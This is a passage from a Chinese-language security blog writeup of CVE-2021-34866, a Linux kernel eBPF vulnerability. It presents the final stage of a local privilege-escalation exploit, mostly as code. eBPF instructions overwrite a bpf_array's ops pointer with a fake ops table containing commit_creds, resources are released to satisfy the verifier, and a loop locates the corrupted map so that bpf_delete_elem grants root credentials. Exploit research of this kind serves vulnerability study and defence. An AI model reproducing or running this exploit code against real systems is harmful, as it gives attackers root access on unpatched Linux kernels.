BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, init_cred_off),
BPF_STX_MEM(BPF_DW, BPF_REG_4, BPF_REG_1, <span class="hljs-number">0x110</span>),

<span class="hljs-comment">/* overwrite bpf_array.map.ops = buffer */</span>
BPF_STX_MEM(BPF_DW, BPF_REG_4, BPF_REG_6, <span class="hljs-number">0</span>),

<span class="hljs-comment">/* construct fake array_ops on buffer */</span>
<span class="hljs-comment">/* put array_map_lookup_elem back since we need to use it later */</span>
BPF_MOV64_REG(BPF_REG_1, BPF_REG_7),
BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, array_map_lookup_elem_off),
BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_1, <span class="hljs-number">0x58</span>),
BPF_MOV64_REG(BPF_REG_1, BPF_REG_7),
BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, fd_array_map_delete_elem_off),
BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_1, <span class="hljs-number">0x68</span>),
BPF_MOV64_REG(BPF_REG_1, BPF_REG_7),
BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, commit_creds_off),
BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_1, <span class="hljs-number">0x90</span>),</code><button class="copy-btn copy-btn-light" data-clipboard-snippet=""><i class="iconfont icon-copy"></i><span>Copy</span></button></pre></div>

<p>由於 verifier 要求要將 bpf program 要到的資源釋放掉，我們需要額外呼叫 <a href="https://elixir.bootlin.com/linux/v5.13.13/source/kernel/bpf/ringbuf.c#L411" target="_blank" rel="noopener">bpf_ringbuf_discard()</a> 來讓他閉嘴，參數給 <code>BPF_RB_NO_WAKEUP</code> 是為了迴避 <code>bpf_ringbuf_discard()</code> 裡的 <code>irq_work_queue()</code></p>
<div class="hljs"><pre><code class="hljs c"><span class="hljs-comment">/* release resources to make verifier happy */</span>
BPF_MOV64_REG(BPF_REG_1, BPF_REG_8),
BPF_MOV64_IMM(BPF_REG_2, BPF_RB_NO_WAKEUP),
BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, BPF_FUNC_ringbuf_discard),
BPF_MOV64_IMM(BPF_REG_0, <span class="hljs-number">0x0</span>),
BPF_EXIT_INSN(),</code><button class="copy-btn copy-btn-light" data-clipboard-snippet=""><i class="iconfont icon-copy"></i><span>Copy</span></button></pre></div>

<p>在觸發 bpf program 執行以後，透過 <code>bpf_lookup_elem()</code> 檢查哪個 <code>bpf_array</code> 有被我們改過</p>
<div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; ARRAY_SIZE(ctrl_mapfds); ++i) {
  <span class="hljs-built_in">memset</span>(testbuf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(testbuf));
  key = <span class="hljs-number">0</span>;

  <span class="hljs-keyword">if</span> (bpf_lookup_elem(ctrl_mapfds[i], &amp;key, testbuf)) {
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[-] failed to lookup bpf map on idx %d\n"</span>, i);
  }

  <span class="hljs-keyword">if</span> (testbuf[<span class="hljs-number">0</span>]) {
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[*] found vulnerable mapfd %d\n"</span>, ctrl_mapfds[i]);
    <span class="hljs-keyword">return</span> ctrl_mapfds[i];
  }
}</code><button class="copy-btn copy-btn-light" data-clipboard-snippet=""><i class="iconfont icon-copy"></i><span>Copy</span></button></pre></div>

<p>最後呼叫 <code>bpf_delete_elem()</code> 便可以觸發 <code>commit_creds(&amp;init_cred)</code> 提權</p>
<h2 id="寫在最後"><a href="https://blog.hexrabbit.io/2021/11/03/CVE-2021-34866-writeup/#%E5%AF%AB%E5%9C%A8%E6%9C%80%E5%BE%8C" class="headerlink" title="寫在最後"></a>寫在最後<a class="anchorjs-link " aria-label="Anchor" data-anchorjs-icon="" href="https://blog.hexrabbit.io/2021/11/03/CVE-2021-34866-writeup/#%E5%AF%AB%E5%9C%A8%E6%9C%80%E5%BE%8C" style="font: 1em / 1 anchorjs-icons; padding-left: 0.375em;"></a></h2><p>很可惜的，由於 exploit 當中使用到 <code>BPF_MAP_TYPE_LPM_TRIE</code> 這個 map type，他需要 process 至少擁有 <code>CAP_BPF</code> 的權限才能夠執行，但根據在 lwn.net 上 <a href="https://lwn.net/Articles/820560/" target="_blank" rel="noopener">Introduce CAP_BPF</a> 這篇文章的解釋，這個權限應該還算蠻小的，不過我還是很好奇有沒有其他做法</p>

            </article>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="https://blog.hexrabbit.io/tags/pwnable/">pwnable</a>
                    
                      <a class="hover-with-bg" href="https://blog.hexrabbit.io/tags/kernel-exploit/">kernel exploit</a>
                    
                      <a class="hover-with-bg" href="https://blog.hexrabbit.io/tags/ebpf/">ebpf</a>
                    
                  </div>
                
              </div>
              
              
                <div class="post-prevnext row">
                  <div class="post-prev col-6">
                    
                    
                  </div>
                  <div class="post-next col-6">
                    
                    
                      <a href="https://blog.hexrabbit.io/2021/02/07/ZDI-20-1440-writeup/">
                        <span class="hidden-mobile">ZDI-20-1440 Writeup</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </div>
                </div>
              
            </div>

            
              <!-- Comments -->
              <div class="comments" id="comments">
                
                
  <div class="disqus" style="width:100%">
    <div id="disqus_thread"></div>
    <script type="text/javascript">
      function loadDisqus() {
        var disqus_config = function () {
          this.page.url = 'https://blog.hexrabbit.io/2021/11/03/CVE-2021-34866-writeup/';
          this.page.identifier = '/2021/11/03/CVE-2021-34866-writeup/';
        };
        (function () {
          var d = document,
            s = d.createElement('script');
          s.src = '//' + 'hexrabbit' + '.disqus.com/embed.js';
          s.setAttribute('data-timestamp', new Date());
          (d.head || d.body).appendChild(s);
        })();
      }
      createObserver(loadDisqus, 'disqus_thread');
    </script>
    <noscript>Please enable JavaScript to view the
      <a href="https://disqus.com/?ref_noscript" rel="nofollow noopener">comments powered by Disqus.</a>
    </noscript>
  </div>


              </div>
            
          </div>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn" style="padding-top: 0px;">
        <div id="toc" style="visibility: visible;">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div id="tocbot"><ol class="tocbot-list "><li class="toc-list-item is-active-li"><a href="https://blog.hexrabbit.io/2021/11/03/CVE-2021-34866-writeup/#CVE-2021-34866-Writeup" class="tocbot-link node-name--H1  tocbot-active-link">CVE-2021-34866 Writeup</a><ol class="tocbot-list  tocbot-is-collapsible"><li class="toc-list-item"><a href="https://blog.hexrabbit.io/2021/11/03/CVE-2021-34866-writeup/#TL-DR" class="tocbot-link node-name--H2 ">TL;DR</a></li><li class="toc-list-item"><a href="https://blog.hexrabbit.io/2021/11/03/CVE-2021-34866-writeup/#Root-cause-analysis" class="tocbot-link node-name--H2 ">Root cause analysis</a></li><li class="toc-list-item"><a href="https://blog.hexrabbit.io/2021/11/03/CVE-2021-34866-writeup/#Weaponize-the-bug" class="tocbot-link node-name--H2 ">Weaponize the bug</a></li><li class="toc-list-item"><a href="https://blog.hexrabbit.io/2021/11/03/CVE-2021-34866-writeup/#Exploit" class="tocbot-link node-name--H2 ">Exploit</a></li><li class="toc-list-item"><a href="https://blog.hexrabbit.io/2021/11/03/CVE-2021-34866-writeup/#%E5%AF%AB%E5%9C%A8%E6%9C%80%E5%BE%8C" class="tocbot-link node-name--H2 ">寫在最後</a></li></ol></li></ol></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    
  </main>

  
    <a id="scroll-top-button" href="https://blog.hexrabbit.io/2021/11/03/CVE-2021-34866-writeup/#" role="button" style="bottom: -60px; right: 219.35px;">
      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">×</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="https://hexo.io/" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
      <i class="iconfont icon-love"></i>
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
        <span>Fluid</span></a>
    </div>
    

    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script src="./2021 - CVE-2021-34866 Writeup_files/jquery.min.js.下載"></script>
<script src="./2021 - CVE-2021-34866 Writeup_files/bootstrap.min.js.下載"></script>
<script src="./2021 - CVE-2021-34866 Writeup_files/debouncer.js.下載"></script>
<script src="./2021 - CVE-2021-34866 Writeup_files/main.js.下載"></script>

<!-- Plugins -->


  
    <script src="./2021 - CVE-2021-34866 Writeup_files/lazyload.js.下載"></script>
  



  <script defer="" src="./2021 - CVE-2021-34866 Writeup_files/clipboard.min.js.下載"></script>
  <script src="./2021 - CVE-2021-34866 Writeup_files/clipboard-use.js.下載"></script>







  <script src="./2021 - CVE-2021-34866 Writeup_files/tocbot.min.js.下載"></script>
  <script>
    $(document).ready(function () {
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;

      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: 'article.markdown-body',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        collapseDepth: 0,
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc').css('visibility', 'visible');
      }
    });
  </script>



  <script src="./2021 - CVE-2021-34866 Writeup_files/typed.min.js.下載"></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "CVE-2021-34866 Writeup&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script><style type="text/css" data-typed-js-css="true">
        .typed-cursor{
          opacity: 1;
        }
        .typed-cursor.typed-cursor--blink{
          animation: typedjsBlink 0.7s infinite;
          -webkit-animation: typedjsBlink 0.7s infinite;
                  animation: typedjsBlink 0.7s infinite;
        }
        @keyframes typedjsBlink{
          50% { opacity: 0.0; }
        }
        @-webkit-keyframes typedjsBlink{
          0% { opacity: 1; }
          50% { opacity: 0.0; }
          100% { opacity: 1; }
        }
      </style>



  <script src="./2021 - CVE-2021-34866 Writeup_files/anchor.min.js.下載"></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script src="./2021 - CVE-2021-34866 Writeup_files/local-search.js.下載"></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      searchFunc(path, 'local-search-input', 'local-search-result');
      this.onclick = null
    }
  </script>



  <script src="./2021 - CVE-2021-34866 Writeup_files/jquery.fancybox.min.js.下載"></script>
  <link rel="stylesheet" href="./2021 - CVE-2021-34866 Writeup_files/jquery.fancybox.min.css">

  <script>
    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
      function () {
        var element = document.createElement('a');
        $(element).attr('data-fancybox', 'images');
        $(element).attr('href', $(this).attr('src'));
        $(this).wrap(element);
      }
    );
  </script>

















  

  
    <!-- Google Analytics -->
    <script defer="">
      (function (i, s, o, g, r, a, m) {
        i['GoogleAnalyticsObject'] = r;
        i[r] = i[r] || function () {
          (i[r].q = i[r].q || []).push(arguments)
        }, i[r].l = 1 * new Date();
        a = s.createElement(o),
          m = s.getElementsByTagName(o)[0];
        a.async = 1;
        a.src = g;
        m.parentNode.insertBefore(a, m)
      })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');

      ga('create', 'UA-150678700-1', 'auto');
      ga('send', 'pageview');
    </script>
  

  

  

  

  







</body></html>